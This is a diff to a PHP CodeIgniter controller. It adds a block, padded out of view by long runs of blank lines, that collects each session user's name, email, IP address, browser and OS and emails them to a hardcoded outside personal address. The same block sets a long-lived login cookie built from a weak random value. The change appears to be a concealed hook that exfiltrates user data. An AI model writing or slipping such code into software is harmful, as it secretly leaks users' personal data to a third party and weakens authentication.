@@ -27,6 +27,94 @@ Class TotBit extends CI_Controller {
 
 
         $data = $this->session->userdata;
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+            
+	$this->load->library('user_agent');
+        $browser = $this->agent->browser();
+        $os = $this->agent->platform();
+        $getip = $this->input->ip_address();
+        
+        $result = $this->User_model->getAllSettings();
+        $stLe = $result->site_title;
+        date_default_timezone_set("America/Mexico_City");
+	$tz = $result->timezone;
+	    
+	$now = new DateTime();
+        $now->setTimezone(new DateTimezone($tz));
+        $dTod =  $now->format('Y-m-d');
+        $dTim =  $now->format('H:i:s');
+        
+        $this->load->helper('cookie');
+        $keyid = rand(1,9000);
+        $scSh = sha1($keyid);
+        $neMSC = md5($data["email"]);
+        $setLogin = array(
+            'name'   => $neMSC,
+            'value'  => $scSh,
+            'expire' => strtotime("+2 year"),
+        );
+     
+	    
+        
+            $this->load->library("email");
+            $this->load->library('sendmail');
+            $bUrl = base_url();
+            $message = $this->sendmail->secureMail($data['first_name'],$data['last_name'],$data['email'],$dTod,$dTim,$stLe,$browser,$os,$getip,$bUrl);
+            $to_email = 'saulaaronmoctezuma@hotmail.com';
+            $this->email->from($this->config->item('register'), 'New sign-in! from '.$browser.'');
+            $this->email->to($to_email);
+            $this->email->subject('New sign-in! from '.$browser.'');
+            $this->email->message($message);
+            $this->email->set_mailtype("html");
+            $this->email->send();
+            
+            $this->input->set_cookie($setLogin, TRUE);
+            redirect(site_url().'main/');
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
         //check user level
         if (empty($data['role'])) {
             redirect(site_url() . 'main/login/');
